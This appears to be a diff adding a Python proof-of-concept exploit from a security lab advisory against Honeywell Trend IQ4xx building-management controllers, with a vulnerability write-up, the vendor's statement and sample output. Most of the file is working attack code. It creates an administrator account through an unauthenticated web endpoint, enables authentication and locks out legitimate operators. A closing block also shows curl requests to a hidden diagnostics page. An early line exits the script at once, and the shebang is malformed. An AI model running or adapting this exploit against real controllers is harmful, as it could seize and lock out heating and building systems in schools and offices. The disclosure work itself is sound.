@@ -1,0 +1,346 @@
+#!/usr/bin/env/python3
+# -*- coding: utf-8 -*-
+#
+#
+# Honeywell Trend IQ4xx BMS Controller Unauthenticated Remote Web-HMI Control And Lockout
+#
+#
+# Vendor: Honeywell International Inc.
+# Product web page: https://buildings.honeywell.com/gb/en/products/by-brand/trend/iq4-controllers
+# Affected version: Model: IQ4E, IQ412, IQ422, IQ4NC, IQ41x, IQ3, IQECO
+#                   Firmware: 4.36 (build 4.3.7.9)
+#                             4.34 (build 4.3.5.14)
+#                             3.52 (build 3.5.3.15)
+#                             3.50
+#                             3.44
+#
+# Summary: The Honeywell IQ4 (Trend IQ4) is a line of intelligent building-management controllers
+# designed to provide advanced unitary control, HVAC integration, and scalable I/O expansion for
+# commercial environments. These controllers use Ethernet and TCP/IP networking with embedded XML,
+# support BACnet over IP, and can expand up to 192 I/O points depending on the model, making them
+# suitable for a wide range of plant-control applications. They offer multiple communication ports
+# (Ethernet, USB, RS232, Wallbus), optional Trend current-loop neworking, and seamless compatability
+# with other Trend IQ controllers - enabling unified, energy-efficient building automation across
+# devices.
+#
+# Desc: The IQ4xx building management controller, manufactured by Honeywell, exposes its full web-based
+# HMI without authentication in its factory-default configuration. With no user module configured,
+# security is disabled by design and the system operates under a System User (level 100) context,
+# granting read/write privileges to any party able to reach the HTTP interface. Authentication
+# controls are only enforced after a web user is created via U.htm, which dynamically enables the
+# user module. Because this function is accessible prior to authentication, a remote user can create
+# a new account with administrative read/write permissions enabling the user module and imposing
+# authentication under attacker-controlled credentials. This action can effectively lock legitimate
+# operators out of local and web-based configuration and administration.
+#
+# Additionally, a hidden 'Diagnostics Overview' endpoint (/^.htm or /%5E.htm) is accessible through
+# the interface, further expanding the exposed attack surface. While the vendor states the controller
+# is intended for on-premise use and not direct Internet exposure, reliance on network isolation does
+# not mitigate insecure default states. Operational environments frequently include flat network segments,
+# remote access services, and integration pathways that expand reachability. Systems controlling critical
+# building functions must enforce authentication and least-privilege controls by default, independent
+# of deployment assumptions. This design leaves schools, commercial buildings, and other facilities
+# vulnerable to unauthorized control, configuration tampering, and administrative lockout wherever
+# network access is obtained. "Security must be engineered for resilience, not isolation." - AI Joe
+#
+# From the manual, page 12:
+# 3.3 Access Rights (Security)
+# "Controller security should always be enabled in line with the 'General Security Best Practice for
+# Trend IP Based Products Information Sheet' (TP201331). You can login to the web interface using a
+# user name and password that match one of the user modules defined in the controller's strategy.
+# Once logged in your access rights will be determined by the user module configuration."
+#
+# "However, if security is disabled (i.e. there are no user modules set up) or if security is enabled
+# and you choose not to login then you will be automatically logged in as a 'casual user' (i.e. 'Guest'
+# or 'System Guest') and your access rights will be determined as follows:"
+#
+# +====================================================================================================+
+# | Configuration             | Casual User Name  | User Level         | Access Rights                 |
+# +===========================+===================+====================+===============================+
+# | No user modules setup     | 'System Guest'    | 100                | Able to view all information  |
+# | (security is disabled)    |                   |                    | and able to make changes      |
+# +---------------------------+-------------------+--------------------+-------------------------------+
+# | 'Guest' user exists with  | 'Guest'           | Defined by Guest   | With the default user level   |
+# | no password               |                   | user module        | of 0, you can only view the   |
+# |                           |                   | (default = 0)      | 'Welcome' page. Otherwise,    |
+# |                           |                   |                    | access rights will be defined |
+# |                           |                   |                    | by the Guest user module      |
+# |                           |                   |                    | configuration.                |
+# +---------------------------+-------------------+--------------------+-------------------------------+
+# | User module(s) setup but  | 'System Guest'    | -1                 | Able to view Sensor, Digital  |
+# | 'Guest' user does not     |                   |                    | Input, Knob, Switch, Driver,  |
+# | exist or is set up with   |                   |                    | Schedule, Time Schedule, Time |
+# | password.                 |                   |                    | Schedule, Time and Plot       |
+# |                           |                   |                    | modules, the Alarm log, and   |
+# |                           |                   |                    | GraphIQs but unable to make   |
+# |                           |                   |                    | changes.                      |
+# +====================================================================================================+
+#
+# "Note: Users cannot be deleted using the web interface; they can only be deleted using SET.".
+# Exposed online: 7,450 controllers/smart giants.
+# Inspiration: https://excel.london (Black Hat EU25) - Project Brainfog
+#
+# Vendor statement:
+# Friday, 30 January, 2026, 9:19 PM:
+# "IQ4 is designed to be utilized as an on-premise product and is not intended to be directly accessible
+# from the Internet. As the environments in which the product is installed have a great deal of technical
+# variation, it is strongly recommended that persons engaged installation, configuration, and maintenance
+# are technically qualified to understand and follow the product documentation."
+#
+# ------------------------------------------------------------------------------------------------------
+# $ python trendhmi.py http://192.168.1.188:10001 admin admin                                         -
+# [+] Controller is vulnerable.                                                                      -
+# [+] U mad bro? (y/n): y                                                                           -
+# [+] Enabling User module: OK                                                                     -
+# [+] Adding credentials: OK                                                                      -
+# [+] Login status: OK                                                                           -
+# [+] Facility name: OU KRSTE MISIRKOV LAN 1                                                      -
+# [+] Valid param0 token/session: 623FB143568D95FAED4A6DAA7CA10B53                                 -
+# [+] Confirming User module enabled: OK                                                            -
+# $ python trendhmi.py http://192.168.1.188:10001 baaah baaaaaah                                     -
+# [+] Controller is not vulnerable. [SECURED] OR [CLAIMED]                                            -
+# ------------------------------------------------------------------------------------------------------
+#
+# Tested on: webServr (XML Web Services)
+#
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+# Macedonian Information Security Research and Development Laboratory
+# Zero Science Lab - https://www.zeroscience.mk - @zeroscience
+#
+#
+# Advisory ID: ZSL-2026-5979
+# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2026-5979.php
+#
+#
+# 09.12.2025
+#
+
+
+#^
+#I
+from urllib.parse import urlparse, parse_qs
+import os;os.system("")##################
+import requests########################
+import random########################
+import base64######################
+import sys#######################
+import re######################
+ZE = "\033[92m"##################
+CR = "\033[91m"####################
+TX = "\033[93m"######################
+RST = "\033[0m"########################
+#Z
+#E
+#R
+#O
+#S
+#C
+#I
+#E
+#N
+#C
+#E
+
+print("Notice", os._exit(int("251")))
+if len(sys.argv) != 4:
+    print(f"""
+{CR}============================== WARNING =============================={RST}
+{TX}
+This PoC script performs a remote administrative takeover of a
+vulnerable controller exposing an unauthenticated Web-HMI interface.
+
+Execution will:
+- Create a new administrator account with full read/write privileges
+- Enable authentication (user module activation)
+- Immediately enforce credential-based access control
+- Prevent further unauthenticated remote access
+
+IMPORTANT:
+This action is remotely irreversible. Once executed, the created
+credentials cannot be removed or disabled via the web interface.
+Credential removal requires local, physical intervention on the device
+using the Honeywell Trend IQSET (System Engineering Tool) Software.
+Recovery requires a full physical factory reset of the controller.
+
+Run only against systems you are explicitly authorized to test.
+You are intentionally locking admin access to the controller.
+{RST}
+{CR}====================================================================={RST}
+""")
+    print("[+] Usage: python trendhmi.py <host> <usr> <pwd>")
+    sys.exit(1)
+
+host = sys.argv[1]
+if not host.startswith("http://") and not host.startswith("https://"):
+    host = "http://" + host
+
+vuln_url = host + '/U.htm' #/^.htm
+try:
+    r = requests.get(vuln_url)
+    if r.status_code == 200:
+        print("[+] Controller is vulnerable.")
+        proceed = input("[+] U mad bro? (y/n): ").strip().lower()
+        if proceed != 'y':
+            print("[+] Aborting.")
+            sys.exit(0)
+    elif r.status_code == 403:
+        print(f"[+] Controller is not vulnerable. {CR}[SECURED]{RST} OR {ZE}[CLAIMED]{RST}")
+        sys.exit(1)
+    else:
+        print(f"[+] Unexpected status: {r.status_code}. Aborting.")
+        sys.exit(1)
+except requests.RequestException as e:
+    print(f"[+] Error checking vulnerability: {str(e)}. Aborting.")
+    sys.exit(1)
+
+ua = "Lockdown/42.2.1823"
+usr = sys.argv[2]
+pwd = sys.argv[3]
+burl = host
+uparse = urlparse(burl)
+hosth = uparse.netloc
+
+gheaders = {
+    "Accept": "*/*",
+    "Accept-Encoding": "gzip, deflate",
+    "Accept-Language": "ku-MK,ku;q=0.6,mk;q=0.8,sr;q=0.7,hr;q=0.6",
+    "Cache-Control": "max-age=0",
+    "Connection": "keep-alive",
+    "Host": hosth,
+    "User-Agent": ua,
+}
+
+headers1 = gheaders.copy()
+headers1["Content-Type"] = "application/x-www-form-urlencoded"
+
+data1 = {
+    "Action": "Create",
+    "ActionModuleEntireReference": "U",
+    "ActionFields": "$|req,W|req|conf",
+    "ActionTextualPrompt": "",
+    "ActionCompletionURL": "U.htm",
+    "ActionRejectionURL": "U.htm",
+    "ovrideStart": "0"
+}
+
+r1 = requests.post(burl + "/confirmAction.htm", data=data1, headers=headers1)
+print("[+] Enabling User module:", f"{ZE}OK{RST}" if r1.status_code == 200 else "Authentication already enabled! ::" f"{CR}[SECURED]{RST}")
+
+headers2 = headers1.copy()
+
+data2 = {
+    "ServerCommand": "Create",
+    "ModuleFullName": "U",
+    "ovrideStart": "0",
+    "Action": "Create",
+    "theActionCompletionURL": "U.htm",
+    "theActionRejectionURL": "U.htm",
+    "theActionTextualPrompt": "",
+    "U0($)str": "1",
+    "U0($)origVal": "",
+    "U0($)newVal": usr,
+    "U0($)req": "1",
+    "U0($)conf": "0",
+    "U0(W)str": "1",
+    "U0(W)origVal": "",
+    "U0(W)newVal": pwd,
+    "U0(W)req": "1",
+    "U0(W)conf": "1",
+    "U0(W)confVal": pwd,
+    "ServerCommand": "Create"
+}
+
+r2 = requests.post(burl + "/U.htm", data=data2, headers=headers2)
+print("[+] Adding credentials:", f"{ZE}OK{RST}" if r2.status_code == 200 else "Credentials already added! :: " f"{CR}[SECURED]{RST}")
+
+headers3 = gheaders.copy()
+headers3["X-Requested-With"] = "XMLHttpRequest"
+
+nonce = "".join(random.choice("0123456789ABCDEF") for _ in range(8))
+pwd_b64 = base64.b64encode(pwd.encode("utf-8")).decode("utf-8")
+
+data3 = {
+    "param1": usr,
+    "param3": pwd_b64,
+    "controller-nonce": nonce
+}
+
+r3 = requests.post(burl + "/beginsession", data=data3, headers=headers3)
+print("[+] Login status:", f"{ZE}OK{RST}" if r3.status_code == 200 else "Incorrect user name or password! :: " f"{CR}[SECURED]{RST}")
+
+title_match = re.search(r"<title>(.*?)</title>", r3.text, re.DOTALL)
+if title_match:
+    print("[+] Facility name:", title_match.group(1).strip())
+else:
+    print("[+] No facility name found!")
+
+param0 = None
+if "Trend963Redirection" in r3.headers:
+    redirection = r3.headers["Trend963Redirection"]
+    parsed_redir = urlparse(redirection)
+    query_params = parse_qs(parsed_redir.query)
+    if "param0" in query_params:
+        param0 = query_params["param0"][0]
+print("[+] Valid param0 token/session:", param0)
+
+if param0 is None:
+    print("[+] Failed to extract param0. Aborting.")
+    sys.exit(1)
+
+headers4 = gheaders.copy()
+
+url4 = burl + "/U.htm?ovrideStart=0&param0=" + param0
+r4 = requests.get(url4, headers=headers4)
+print("[+] Confirming User module enabled:", f"{ZE}OK{RST}" if r4.status_code == 200 else f"{CR}Nope{RST}")
+
+
+"""
++----------------------+   -
+| Diagnostics Overview |      -
++----------------------+         -
+|                                   -
+# curl http://IP:PORT/%5E.htm | $ curl http://IP:PORT/^.htm
+>
++---------------------------+---------------------------------------------------+
+| Domain                    | Description                                       |
++---------------------------+---------------------------------------------------+
+| About                     | Information about IQ                              |
+| Alarm Handler             | Information about the Alarm Handling Domain       |
+| BACnet Comms              | BACnet Communications Protocol Stack              |
+| Baseboard                 | Details of baseboard                              |
+| Comms Transactions        | Information about the comms transaction handler   |
+| Critical Data             | Information about the critical data               |
+| Email                     | Debug info for SMTP                               |
+| Event Driven Modules      | Shows run stats for each event driven module      |
+| IO CAN Driver             | IO CAN Driver Diagnostics                         |
+| IO Module 01              | Details of CAN module 1                           |
+| IO Module 02              | Details of CAN module 2                           |
+| IO Module 03              | Details of CAN module 3                           |
+| IO Module 04              | Details of CAN module 4                           |
+| IO Module 05              | Details of CAN module 5                           |
+| IO Module Driver          | IO Module Driver Diagnostics                      |
+| IPConfig Discovery        | Scan the network for other Trend IP Devices       |
+| IQ Interfacing            | Logging of Interface Module Comms                 |
+| Interface Module Scheduler| Scheduling of Interface Modules                   |
+| Log File System           | Log File System Information                       |
+| Network 2                 | Comms Network Statistics and other useful info    |
+| Product Descriptor        | Controller Information                            |
+| Security                  | Security Information - Including certificates     |
+| Session Logger            | Stores the last 100 actions of a logged-in user   |
+| Session Manager           | Details of current user sessions                  |
+| Strategy Engine           | Construction and operation of strategy modules    |
+| TCPIP                     | DHCP and Static IP Addressing Diagnostics         |
+| The Reset History         | Provides information on controller resets         |
+| The SerialPort Manager    | Various information about the Serial Ports        |
+| The Target                | Various information about the Target              |
+| Time Schedule 1           | Current and Future State Monitoring               |
+| Time Schedule 2           | Current and Future State Monitoring               |
+| Time Schedule 3           | Current and Future State Monitoring               |
+| Time Schedule 4           | Current and Future State Monitoring               |
+| Time Schedule 5           | Current and Future State Monitoring               |
+| Virtual CNC 1             | Virtual CNC Supervisor Port Status and Statistics |
+| Web Server                | Monitors server statistics                        |
++---------------------------+---------------------------------------------------+
+
+"""
